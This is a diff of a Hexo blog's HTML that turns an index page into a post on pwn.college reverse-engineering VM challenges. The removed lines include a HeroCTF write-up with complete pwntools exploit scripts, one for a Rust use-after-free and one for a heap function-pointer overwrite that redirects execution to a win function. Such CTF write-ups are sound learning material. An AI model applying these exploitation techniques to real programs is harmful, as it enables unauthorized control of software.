@@ -20,28 +20,33 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Hexo">
-<meta property="og:url" content="http://example.com/index.html">
+  <meta name="description" content="概述pwncollege的逆向模块，前几题ida基本上可以直接看出来，或者pwndbg动调出来，直到6.0开始就是比较多的逆向，其实无非是异或，换位，排序，反序，对着源代码写写py就出来了 12.0&#x2F;12.1从这里开始就变成了vm题，当然，是很简单的vm题 13.01234567891011121314[s] IMM b &#x3D; 0x88[s] IMM c &#x3D; 0x1[s] IMM a &#x3D;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwn-college-Reverse-Engineering">
+<meta property="og:url" content="http://example.com/2024/10/31/pwn-college-Reverse-Engineering/index.html">
 <meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="概述pwncollege的逆向模块，前几题ida基本上可以直接看出来，或者pwndbg动调出来，直到6.0开始就是比较多的逆向，其实无非是异或，换位，排序，反序，对着源代码写写py就出来了 12.0&#x2F;12.1从这里开始就变成了vm题，当然，是很简单的vm题 13.01234567891011121314[s] IMM b &#x3D; 0x88[s] IMM c &#x3D; 0x1[s] IMM a &#x3D;">
 <meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2024-10-31T10:36:31.000Z">
+<meta property="article:modified_time" content="2024-11-11T09:21:40.142Z">
 <meta property="article:author" content="John Doe">
+<meta property="article:tag" content="pwn">
 <meta name="twitter:card" content="summary">
 
-<link rel="canonical" href="http://example.com/">
+<link rel="canonical" href="http://example.com/2024/10/31/pwn-college-Reverse-Engineering/">
 
 
 <script id="page-configurations">
   // https://hexo.io/docs/variables.html
   CONFIG.page = {
     sidebar: "",
-    isHome : true,
-    isPost : false,
+    isHome : false,
+    isPost : true,
     lang   : 'en'
   };
 </script>
 
-  <title>Hexo</title>
+  <title>pwn-college-Reverse-Engineering | Hexo</title>
   
 
 
@@ -144,9 +149,10 @@
         <div class="content-wrap">
           
 
-          <div class="content index posts-expand">
+          <div class="content post posts-expand">
             
-      
+
+    
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
@@ -162,10 +168,9 @@
       <meta itemprop="name" content="Hexo">
     </span>
       <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2024/10/31/pwn-college-Reverse-Engineering/" class="post-title-link" itemprop="url">pwn-college-Reverse-Engineering</a>
-        </h2>
+        <h1 class="post-title" itemprop="name headline">
+          pwn-college-Reverse-Engineering
+        </h1>
 
         <div class="post-meta">
             <span class="post-meta-item">
@@ -195,7 +200,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>pwncollege的逆向模块，前几题ida基本上可以直接看出来，或者pwndbg动调出来，直到6.0开始就是比较多的逆向，其实无非是异或，换位，排序，反序，对着源代码写写py就出来了</p>
+        <h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>pwncollege的逆向模块，前几题ida基本上可以直接看出来，或者pwndbg动调出来，直到6.0开始就是比较多的逆向，其实无非是异或，换位，排序，反序，对着源代码写写py就出来了</p>
 <h1 id="12-0-x2F-12-1"><a href="#12-0-x2F-12-1" class="headerlink" title="12.0&#x2F;12.1"></a>12.0&#x2F;12.1</h1><p>从这里开始就变成了vm题，当然，是很简单的vm题</p>
 <h1 id="13-0"><a href="#13-0" class="headerlink" title="13.0"></a>13.0</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[s] IMM b = 0x88</span><br><span class="line">[s] IMM c = 0x1</span><br><span class="line">[s] IMM a = 0xb</span><br><span class="line">[s] STM *b = a</span><br><span class="line">[s] ADD b c</span><br><span class="line">[s] IMM a = 0x3a</span><br><span class="line">[s] STM *b = a</span><br><span class="line">[s] ADD b c</span><br><span class="line">[s] IMM a = 0x69</span><br><span class="line">[s] STM *b = a</span><br><span class="line">[s] ADD b c</span><br><span class="line">[s] IMM a = 0xce</span><br><span class="line">[s] STM *b = a</span><br><span class="line">[s] ADD b c</span><br></pre></td></tr></table></figure>
 
@@ -261,677 +266,34 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">op:执行的指令</span><br><span class="line">arg1:第一个参数，指寄存器</span><br><span class="line">arg2:第二个参数</span><br><span class="line">a:0x1</span><br><span class="line">b:0x2</span><br><span class="line">c:0x4</span><br><span class="line">d:0x8</span><br><span class="line">s:0x10</span><br><span class="line">i:0x20</span><br><span class="line">f:0x40</span><br></pre></td></tr></table></figure>
 
 
-      
     </div>
 
     
     
     
+
       <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+          </div>
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2024/10/28/hero-ctf/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2024/10/28/hero-ctf/" class="post-title-link" itemprop="url">Untitled</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2024-10-28 17:48:42" itemprop="dateCreated datePublished" datetime="2024-10-28T17:48:42+08:00">2024-10-28</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2024-10-30 19:47:40" itemprop="dateModified" datetime="2024-10-30T19:47:40+08:00">2024-10-30</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="Bankrupst"><a href="#Bankrupst" class="headerlink" title="Bankrupst"></a>Bankrupst</h1><p>简单的UAF+Rust</p>
-<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p>存款大于1337时show可以得到flag，但每次存款不得超过100，存储次数不得超过13</p>
-<p>简单的银行账户管理系统，但是使用了unsafe，在内存管理方面没有 Rust 的安全保障。</p>
-<p>于是有了这个漏洞</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">5 =&gt; &#123;</span><br><span class="line">    if opened &#123;</span><br><span class="line">        (*account).balance=0;</span><br><span class="line">        (*account).deposits = 0;</span><br><span class="line">        ptr::drop_in_place(account);</span><br><span class="line">        opened = false;</span><br><span class="line">        println!(&quot;BankRupst card removed.&quot;);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        println!(&quot;You must insert your BankRupst card!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">6 =&gt; &#123;</span><br><span class="line">    if opened &#123;</span><br><span class="line">        (*account).balance=0;</span><br><span class="line">        (*account).deposits = 0;</span><br><span class="line">        let layout = Layout::new::&lt;BankAccount&gt;();</span><br><span class="line">        dealloc(account as *mut u8, layout);</span><br><span class="line">        account = ptr::null_mut();</span><br><span class="line">        opened = false;</span><br><span class="line">        println!(&quot;Thank you for using BankRupst!&quot;);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        println!(&quot;Thank you for using BankRupst!&quot;);</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p>仔细观察5和6的区别，5在将元素置零后仅仅使用了<code>drop_in_place</code>并没有直接释放内存块</p>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>存款够13次后直接取出卡，再插卡，就会发现依旧有1300的存款</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line"></span><br><span class="line">context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;,log_level=&#x27;DEBUG&#x27;)</span><br><span class="line">#r=process(&#x27;./bankRupst&#x27;)</span><br><span class="line">r=remote(&quot;pwn.heroctf.fr&quot;,6001)</span><br><span class="line">s   = lambda x : r.send(x)</span><br><span class="line">sl  = lambda x : r.sendline(x)</span><br><span class="line">sa  = lambda x,y : r.sendafter(x, y)</span><br><span class="line">sla = lambda x,y : r.sendlineafter(x, y)</span><br><span class="line">rc  = lambda x : r.recv(x)</span><br><span class="line">ru  = lambda x : r.recvuntil(x)</span><br><span class="line">rcg = lambda : u64(rc(6).ljust(8, b&#x27;\x00&#x27;))</span><br><span class="line">uu64 = lambda : u64(r.recvuntil(&quot;\x7f&quot;).ljust(8, b&#x27;\x00&#x27;))</span><br><span class="line">ra = lambda : r.recvall(timeout=1)</span><br><span class="line">sla(&quot;option:&quot;,str(1))</span><br><span class="line">for i in range(0,13):</span><br><span class="line">    sla(&quot;option:&quot;,str(2))</span><br><span class="line">    sla(&quot;deposit?&quot;,str(100))</span><br><span class="line"></span><br><span class="line">sla(&quot;option:&quot;,str(5))</span><br><span class="line">sla(&quot;option:&quot;,str(1))</span><br><span class="line">sla(&quot;option:&quot;,str(4))</span><br><span class="line">ra()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h1 id="Heappie"><a href="#Heappie" class="headerlink" title="Heappie"></a>Heappie</h1><p>glibc:2.36(debian12u8)</p>
-<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>简单的音乐播放器</p>
-<p>堆结构，但是其实是指针覆写，各种保护齐开且不存在free，存在win函数</p>
-<p>可能随机调用三个函数之一，</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;Enter music description: &quot;);</span><br><span class="line">__isoc99_scanf(&quot;%s&quot;, music-&gt;description);</span><br></pre></td></tr></table></figure>
-
-<p>可尝试覆写到函数指针</p>
-<h2 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>首先利用</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;\t%d. %s by %s (song: %p)\n&quot;, i + 1, playlist[i].title, playlist[i].artist, playlist[i].play);</span><br></pre></td></tr></table></figure>
-
-<p>泄露出pie基址</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">for i in [play1_sym, play2_sym, play3_sym]:</span><br><span class="line">    if (play_addr - i) % 0x100 == 0:</span><br><span class="line">        pie = play_addr - i</span><br><span class="line">        break</span><br><span class="line">win_addr = pie + elf.sym[&quot;win&quot;]</span><br></pre></td></tr></table></figure>
-
-<p>playlist结构体</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /40gx playlist</span><br><span class="line">0x55555555c2a0: 0x000055555555527d      0x0000000000000061</span><br><span class="line">0x55555555c2b0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c2c0: 0x0000000000000000      0x0000000000000061</span><br><span class="line">0x55555555c2d0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c2e0: 0x0000000000000000      0x0000000000000061</span><br><span class="line">0x55555555c2f0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c300: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c310: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c320: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c330: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c340: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c350: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c360: 0x0000000000000000      0x000055555555527d</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>可以覆写des到第二个的play函数，当“Do you want to add a sound to the music? (y&#x2F;n):”选择为n时不会设置play函数</p>
-<p>所以exp为</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(arch=&quot;amd64&quot;, os=&quot;linux&quot;, log_level=&quot;DEBUG&quot;)</span><br><span class="line">filename = &quot;./heappie&quot;</span><br><span class="line">r = process(filename)</span><br><span class="line">elf = ELF(filename)</span><br><span class="line"># r = remote(&quot;pwn.heroctf.fr&quot;, 6001)</span><br><span class="line">s = lambda x: r.send(x)</span><br><span class="line">sl = lambda x: r.sendline(x)</span><br><span class="line">sa = lambda x, y: r.sendafter(x, y)</span><br><span class="line">sla = lambda x, y: r.sendlineafter(x, y)</span><br><span class="line">rc = lambda x: r.recv(x)</span><br><span class="line">ru = lambda x: r.recvuntil(x)</span><br><span class="line">rcg = lambda: u64(rc(6).ljust(8, b&quot;\x00&quot;))</span><br><span class="line">uu64 = lambda: u64(r.recvuntil(&quot;\x7f&quot;).ljust(8, b&quot;\x00&quot;))</span><br><span class="line">ra = lambda: r.recvall(timeout=1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add_y(title, artist, description):</span><br><span class="line">    sla(&quot;&gt;&gt;&quot;, &quot;1&quot;)</span><br><span class="line">    sla(&quot;(y/n): &quot;, &quot;y&quot;)</span><br><span class="line">    sla(&quot;:&quot;, title)</span><br><span class="line">    sla(&quot;:&quot;, artist)</span><br><span class="line">    sla(&quot;:&quot;, description)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add_n(title, artist, description):</span><br><span class="line">    sla(&quot;&gt;&gt;&quot;, &quot;1&quot;)</span><br><span class="line">    sla(&quot;(y/n): &quot;, &quot;n&quot;)</span><br><span class="line">    sla(&quot;:&quot;, title)</span><br><span class="line">    sla(&quot;:&quot;, artist)</span><br><span class="line">    sla(&quot;:&quot;, description)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def play(idx):</span><br><span class="line">    sla(&quot;&gt;&gt;&quot;, &quot;2&quot;)</span><br><span class="line">    sla(&quot;index: &quot;, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def free(idx):</span><br><span class="line">    sla(&quot;&gt;&gt;&quot;, &quot;3&quot;)</span><br><span class="line">    sla(&quot;index: &quot;, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">    sla(&quot;&gt;&gt;&quot;, &quot;4&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">play1_sym = elf.sym[&quot;play_1&quot;]</span><br><span class="line">play2_sym = elf.sym[&quot;play_2&quot;]</span><br><span class="line">play3_sym = elf.sym[&quot;play_3&quot;]</span><br><span class="line"></span><br><span class="line">add_y(&quot;A&quot;, &quot;A&quot;, &quot;A&quot;)</span><br><span class="line">show(0)</span><br><span class="line">ru(&quot;0x&quot;)</span><br><span class="line">play_addr = int(rc(12), 16)</span><br><span class="line">pie = 0</span><br><span class="line">for i in [play1_sym, play2_sym, play3_sym]:</span><br><span class="line">    if (play_addr - i) % 0x100 == 0:</span><br><span class="line">        pie = play_addr - i</span><br><span class="line">        break</span><br><span class="line"></span><br><span class="line">win_addr = pie + elf.sym[&quot;win&quot;]</span><br><span class="line">payload = b&quot;a&quot; * (0x360 - 0x2E0) + p64(win_addr)</span><br><span class="line">add_n(&quot;a&quot;, &quot;a&quot;, payload)</span><br><span class="line">add_n(&quot;a&quot;, &quot;a&quot;, &quot;a&quot;)</span><br><span class="line"></span><br><span class="line">play(2)</span><br><span class="line"></span><br><span class="line">ra()</span><br><span class="line"></span><br><span class="line">log.info(&quot;pie: &quot; + hex(pie))</span><br><span class="line">log.info(&quot;play_addr: &quot; + hex(play_addr))</span><br><span class="line">log.info(&quot;play1_sym: &quot; + hex(play1_sym))</span><br><span class="line">log.info(&quot;play2_sym: &quot; + hex(play2_sym))</span><br><span class="line">log.info(&quot;play3_sym: &quot; + hex(play3_sym))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h1 id="Buafllet"><a href="#Buafllet" class="headerlink" title="Buafllet"></a>Buafllet</h1>
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2024/10/21/pwn-college-building-a-web-server/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2024/10/21/pwn-college-building-a-web-server/" class="post-title-link" itemprop="url">building-a-web-server</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2024-10-21 21:19:06 / Modified: 20:11:00" itemprop="dateCreated datePublished" datetime="2024-10-21T21:19:06+08:00">2024-10-21</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>pwncollege的建立简单web服务器</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2024/10/21/pwn-college-building-a-web-server/">
-                Read more &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
         
-      
-    </div>
 
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2024/10/21/pwn-college-assembly-crash-course/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2024/10/21/pwn-college-assembly-crash-course/" class="post-title-link" itemprop="url">assembly-crash-course</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2024-10-21 21:19:06 / Modified: 20:10:48" itemprop="dateCreated datePublished" datetime="2024-10-21T21:19:06+08:00">2024-10-21</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>pwncollege的汇编模块</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2024/10/21/pwn-college-assembly-crash-course/">
-                Read more &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
         
-      
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2024/10/28/hero-ctf/" rel="prev" title="">
+      <i class="fa fa-chevron-left"></i> 
+    </a></div>
+      <div class="post-nav-item"></div>
     </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
       </footer>
+    
   </article>
   
   
   
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2024/10/18/pwn-college-Program-Interaction-Fundamentals/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2024/10/18/pwn-college-Program-Interaction-Fundamentals/" class="post-title-link" itemprop="url">Program-Interaction-Fundamentals</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2024-10-18 21:19:06" itemprop="dateCreated datePublished" datetime="2024-10-18T21:19:06+08:00">2024-10-18</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2024-10-21 20:11:25" itemprop="dateModified" datetime="2024-10-21T20:11:25+08:00">2024-10-21</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>pwncollege的程序交互模块</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2024/10/18/pwn-college-Program-Interaction-Fundamentals/">
-                Read more &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2024/10/18/pwn-college-debugging-refresher/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2024/10/18/pwn-college-debugging-refresher/" class="post-title-link" itemprop="url">debugging-refresher</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2024-10-18 21:19:06" itemprop="dateCreated datePublished" datetime="2024-10-18T21:19:06+08:00">2024-10-18</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2024-10-21 20:11:14" itemprop="dateModified" datetime="2024-10-21T20:11:14+08:00">2024-10-21</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>pwncollege的gdb模块</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2024/10/18/pwn-college-debugging-refresher/">
-                Read more &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2024/10/18/pwn-college-talking-web/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2024/10/18/pwn-college-talking-web/" class="post-title-link" itemprop="url">talking-web</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2024-10-18 21:19:06" itemprop="dateCreated datePublished" datetime="2024-10-18T21:19:06+08:00">2024-10-18</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2024-10-21 20:11:51" itemprop="dateModified" datetime="2024-10-21T20:11:51+08:00">2024-10-21</time>
